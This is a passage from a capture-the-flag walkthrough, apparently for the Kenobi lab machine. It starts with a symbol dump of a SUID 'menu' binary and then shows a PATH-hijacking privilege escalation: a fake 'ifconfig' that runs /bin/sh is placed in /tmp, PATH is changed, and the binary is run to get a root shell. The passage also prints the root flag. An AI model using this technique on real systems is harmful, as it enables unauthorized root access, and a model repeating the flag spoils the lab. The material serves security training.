__do_global_dtors_aux
completed.7594
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
menu.c
__FRAME_END__
__JCR_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
_ITM_deregisterTMCloneTable
puts@@GLIBC_2.2.5
_edata
__stack_chk_fail@@GLIBC_2.4
system@@GLIBC_2.2.5
printf@@GLIBC_2.2.5
__libc_start_main@@GLIBC_2.2.5
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_csu_init
__bss_start
main
_Jv_RegisterClasses
__isoc99_scanf@@GLIBC_2.7
__TMC_END__
_ITM_registerTMCloneTable
setuid@@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.interp
.note.ABI-tag
.note.gnu.build-id
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.jcr
.dynamic
.got.plt
.data
.bss
.comment
# 
```

As this file runs as the root users privileges, we can manipulate our path gain a root shell.

We copied the /bin/sh shell, called it ifconfig, gave it the correct permissions and then put its location in our path. This meant that when the /usr/bin/menu binary was run, its using our path variable to find the "ifconfig" binary. Which is actually a version of /usr/sh, as well as this file being run as root it runs our shell as root:

``` 
kenobi@kenobi:~$ cd /tmp
kenobi@kenobi:/tmp$ ls
systemd-private-e2cb0b009eed452a9b06f9c9475774e1-systemd-timesyncd.service-aJ3cC4
kenobi@kenobi:/tmp$ echo /bin/sh > ifconfig
kenobi@kenobi:/tmp$ chmod 777 ifconfig
kenobi@kenobi:/tmp$ export PATH=/tmp:$PATH
kenobi@kenobi:/tmp$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :3
# ls
ifconfig  systemd-private-e2cb0b009eed452a9b06f9c9475774e1-systemd-timesyncd.service-aJ3cC4
# id
uid=0(root) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)
# cd /root/    
# ls
root.txt
# more root.txt
177b3cd8562289f37382721c28381f02
# 
```

The flag is 177b3cd8562289f37382721c28381f02.
